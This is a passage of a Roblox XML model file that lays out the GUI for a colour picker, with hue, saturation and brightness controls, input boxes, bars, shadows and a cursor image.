										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="ImageLabel" referent="RBX863E8C6DC1E24ADE80A05FC7E501740E">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141186650</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<string name="Name">Cursor</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>-2</XO>
											<YS>0</YS>
											<YO>-8</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>16</XO>
											<YS>0</YS>
											<YO>16</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX08256492C8D74DA3B34BD0E14F6C9BC0">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">HueOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>218</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-25</XO>
										<YS>0</YS>
										<YO>34</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX5573F7630D274262AC274DBE36665C40">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">4</token>
										<token name="FontSize">6</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>15</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>100</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Hue</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">18</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXEC7F1CDB513F47CDB50B8648C0A1E36F">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Input</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>4</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>26</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBX23C880BBE93746039BE1E924324F8399">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBXEBD202F86FB24110875E895E9B3B863C">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX3B0598ECFF214EC38FB4D4BED05CE8E0">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">360</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXDE091BFDA91F40CC87F69F58302DE0CA">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Bar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>-4</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX05075A2195D34F549D2438A80DED3754">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">0.899999976</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Shadow</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>-3</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>3</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX6C450B42DAD84E37852DE87526949F83">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">SaturationOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>255</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-25</XO>
										<YS>0</YS>
										<YO>34</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX1A3A5B9D25CF402A900F36CDC854D589">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">4</token>
										<token name="FontSize">6</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>15</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>100</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Saturation</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">18</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX95719776108044048691C6564C5240F8">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Input</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>100</XO>
											<YS>0</YS>
											<YO>4</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>26</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBXC59EFE856C7C429B9EF5719FBC824E9A">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBXE1E5C3A8650C413D82EB8D90B5ADC3AB">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBXCE4C56F6E2FB4EA68D850489BD0CF5A8">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">100%</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX6E28C1D33B1541DF9783ACECB52A0E46">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Bar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>-4</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX92A73DD00D0249EDBCCF560C9DB5CCAB">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">0.899999976</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Shadow</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>-3</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>3</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXA123D2C2739F4D86A9721F4C168C4FDE">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">ValueOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>292</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-25</XO>
										<YS>0</YS>
										<YO>34</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX9E29E0B895084F5293F66C63B6B0F938">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">4</token>
										<token name="FontSize">6</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>15</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>100</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Brightness</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">18</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXD4BF1B77B34647ACB8116C1D71ABC68E">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Input</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>100</XO>
											<YS>0</YS>
											<YO>4</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>26</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBXDB92BA7E56974F0AB4DA7B336B684110">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
